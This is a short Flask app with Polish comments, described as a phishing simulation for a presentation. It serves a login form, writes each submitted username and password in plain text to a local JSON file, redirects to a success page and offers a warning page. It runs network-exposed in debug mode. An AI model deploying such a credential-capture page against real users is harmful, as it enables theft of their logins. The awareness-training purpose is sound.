from flask import Flask, render_template, request, redirect
import json

app = Flask(__name__)

# Strona logowania
@app.route("/")
def login():
    return render_template("login.html")

# Obsługa formularza logowania
@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")

    # Zapis danych do pliku JSON
    with open("captured_data.json", "a") as f:
        json.dump({"username": username, "password": password}, f)
        f.write("\n")

    # Przekierowanie na "sukces" (symulacja phishingu)
    return redirect("../success")

# Strona sukcesu
@app.route("/success")
def success():
    return render_template("success.html")

# Strona ostrzegająca przed phishingiem (dla prezentacji)
@app.route("/warning")
def warning():
    return render_template("warning.html")

if __name__ == "__main__":
    port = 5000  # Port, na którym uruchamiana jest aplikacja
    print(f"\nAplikacja działa! Otwórz w przeglądarce link: http://127.0.0.1:{port}\n")
    app.run(debug=True, host='0.0.0.0', port=port)
